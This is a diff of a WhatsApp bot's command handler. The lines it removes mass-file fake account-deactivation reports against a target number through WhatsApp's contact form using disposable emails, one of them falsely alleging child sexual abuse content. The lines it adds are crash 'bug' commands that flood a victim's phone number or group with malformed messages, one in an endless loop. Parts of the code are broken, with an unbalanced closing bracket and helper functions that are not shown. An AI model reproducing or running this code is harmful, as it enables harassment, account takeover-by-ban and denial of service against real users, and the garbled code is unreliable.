-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv5': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv6': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv1': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv2': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv3': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv4': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv5': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+//bug cases
+case "xandroid": {
+  if (!XeonTheCreator) return
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "916909137213") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("The number is not registered on WhatsApp");
+  }
+  replygcxeon("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendVariousMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios": {
+  if (!XeonTheCreator) return
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "916909137213") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("The number is not registered on WhatsApp");
+  }
+  replygcxeon("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios2":
+  {
+	if (!XeonTheCreator) return
+    if (!isBot) {
+      return replygcxeon("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return replygcxeon(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcxeon("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendMultiplePaymentInvites(m.chat, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+break;
+case "xandroid2":
+  {
+	if (!XeonTheCreator) return
+    if (!isBot) {
+      return replygcxeon("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return replygcxeon(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcxeon("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendVariousMessages(m.chat, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+break;
+case "xgc":
+  {
+    if (!XeonTheCreator) return
+    if (!text) {
+      return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+    }
+    replygcxeon("please wait, " + command + " bug is in process..");
+    if (!text.split(" ")[0].includes("whatsapp.com")) {
+      return replygcxeon("Link Invalid!");
+    }
+    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+    try {
+      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
+      await sleep(2000); // Adjusted sleep time for clarity
+      sendViewOnceMessages(groupTarget, bugAmount);
+      await sleep(2500); // Adjusted sleep time for clarity
+      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
+      XeonBotInc.groupLeave(groupTarget);
+    } catch (error) {
+      replygcxeon(util.format(error));
+    }
+  }
+break;
+case "🙂":
+  {
+	if (!XeonTheCreator) return
+    if (!isBot) {
+      return replygcxeon("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return replygcxeon(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcxeon("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendViewOnceMessages(m.chat, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "systemuicrash": {
+  if (!XeonTheCreator) return
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "916909137213") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("The number is not registered on WhatsApp");
+  }
+  replygcxeon("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMixedMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+  break;
+  case "xsysui": {
+  if (!XeonTheCreator) return
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "916909137213") {
+    return;
+  );
+}
+break;
+case 'ioskill': case 'iosx': {
+            	if (!XeonTheCreator) return
+let xeonyvictim = q.replace(/[^0-9]/g, "")
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+await replygcxeon(`In process....`)
+let target = xeonyvictim + '@s.whatsapp.net'
+  for (;;) {
+    await aipong(target)
+    await sleep(1200)
+  }
+}
+break;
+case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
+if (!XeonTheCreator) return
+if (!q) return replygcxeon(`Usage .${command} 916909137213`)
+let xeonyvictim = q.replace(/[^0-9]/g, "")
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+let target = xeonyvictim + '@s.whatsapp.net'
+await replygcxeon(`In process....`)
+for (let j = 0; j < 1; j++) {
+await listxeonfck(target, oneclickxeon)
+await locationxeony(target, force)
+await xeonkillpic(target, oneclickxeon)
+await locationxeony(target, force)
+await blackening(target, force2)
+await locationxeony(target, force)
+}
+await replygcxeon(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
 }
 break
 
-            default:
+                default:
                 if (budy.startsWith('=>')) {
                     if (!XeonTheCreator) return XeonStickOwner()
                     function Return(sul) {
@@ -9736,7 +9113,7 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
     } catch (err) {
         console.log(util.format(err))
         let e = String(err)
-XeonBotInc.sendMessage("13038480418@s.whatsapp.net", { text: "hi the developer of toge my bot is having a problem please fix this" + util.format(e), 
+XeonBotInc.sendMessage("6283833304947@s.whatsapp.net", { text: "hi the developer of toge my bot is having a problem please fix this" + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
